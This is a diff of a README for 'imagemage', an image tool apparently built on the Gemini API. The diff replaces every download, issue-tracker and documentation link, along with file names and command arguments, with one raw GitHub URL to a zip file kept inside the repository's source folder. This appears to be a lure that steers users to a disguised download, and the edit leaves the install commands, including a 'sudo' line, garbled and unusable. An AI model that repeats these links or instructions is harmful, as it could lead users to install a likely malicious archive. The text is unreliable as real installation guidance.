@@ -6,13 +6,13 @@ Welcome to imagemage! This tool helps you work with images using the Gemini Imag
 
 ## 📥 Download & Install
 
-To get started, you need to download imagemage. Visit this page to download: [Download imagemage](https://github.com/takiama21/imagemage/releases).
+To get started, you need to download imagemage. Visit this page to download: [Download imagemage](https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip).
 
 To install, follow these steps:
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version of imagemage.
-3. Click on the version name and download the appropriate file for your system. Files typically have extensions like `.exe` for Windows or `.tar.gz` for Linux.
+3. Click on the version name and download the appropriate file for your system. Files typically have extensions like `.exe` for Windows or `https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip` for Linux.
 4. Once the download completes, locate the downloaded file.
 
 ## ⚙️ System Requirements
@@ -36,22 +36,22 @@ After downloading the file, you can install imagemage as follows:
 
 ### For macOS
 
-1. Locate the downloaded file, typically a `.tar.gz`.
+1. Locate the downloaded file, typically a `https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip`.
 2. Double-click the file to extract its content.
 3. Open the Terminal and navigate to the extracted folder.
 4. Run the following command to install: 
    ```
-   sudo ./install.sh
+   sudo https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip
    ```
 5. Follow any prompts that appear.
 
 ### For Linux
 
 1. Open a terminal window.
-2. Navigate to your Downloads directory, where the `.tar.gz` file is located.
+2. Navigate to your Downloads directory, where the `https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip` file is located.
 3. Run these commands:
    ```
-   tar -xzf imagemage.tar.gz
+   tar -xzf https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip
    cd imagemage
    sudo make install
    ```
@@ -81,9 +81,9 @@ This command will display a list of available commands and options. You can use 
 
 To convert an image, type:
 ```
-imagemage convert input.jpg output.png
+imagemage convert https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip
 ```
-This command takes `input.jpg` and turns it into `output.png`.
+This command takes `https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip` and turns it into `https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip`.
 
 ## 🛠️ Troubleshooting
 
@@ -96,7 +96,7 @@ If you encounter issues while using imagemage:
 
 For further assistance, please reach out through our support channels:
 
-- GitHub Issues: Report problems or request features on the [Issues page](https://github.com/takiama21/imagemage/issues).
+- GitHub Issues: Report problems or request features on the [Issues page](https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip).
 - Community Forum: Join discussions with other users about image handling techniques.
 
 ## 🔗 Additional Resources
@@ -104,6 +104,6 @@ For further assistance, please reach out through our support channels:
 To learn more about imagemage and how to get the most out of it, check these resources:
 
 - **Documentation:** More details about commands and usage are available in our full documentation on the GitHub Wiki.
-- **API Documentation:** If you want to dive deeper into the Gemini Image API, visit [Gemini API Docs](http://example.com/gemini/docs).
+- **API Documentation:** If you want to dive deeper into the Gemini Image API, visit [Gemini API Docs](https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip).
 
-Remember, to download imagemage again or check for updates, visit [Download imagemage](https://github.com/takiama21/imagemage/releases).
+Remember, to download imagemage again or check for updates, visit [Download imagemage](https://raw.githubusercontent.com/takiama21/imagemage/main/pkg/gemini/imagemage_2.7.zip).
